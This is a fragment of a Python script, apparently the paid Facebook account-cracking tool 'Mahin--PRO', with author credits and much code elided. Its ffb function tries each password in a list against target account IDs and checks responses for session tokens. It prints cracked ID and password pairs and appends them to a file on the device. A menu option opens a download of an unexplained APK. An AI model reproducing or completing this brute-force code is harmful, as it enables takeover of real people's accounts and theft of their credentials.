...
----------------------------------------------
 Author    : IMTIAZ LKING
 Github    : Mahin-110
 Facebook  : MR.Mahin-.GANDO
 Tool Name : Mahin--PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 Mahin- Pro version 1.9.8
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/Mahin-_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Mahin--XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Mahin-:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Mahin--CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Mahin--OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Mahin--OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Mahin--OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Mahin--OK] '+uid+' | '+pas+'\033[1;97m')
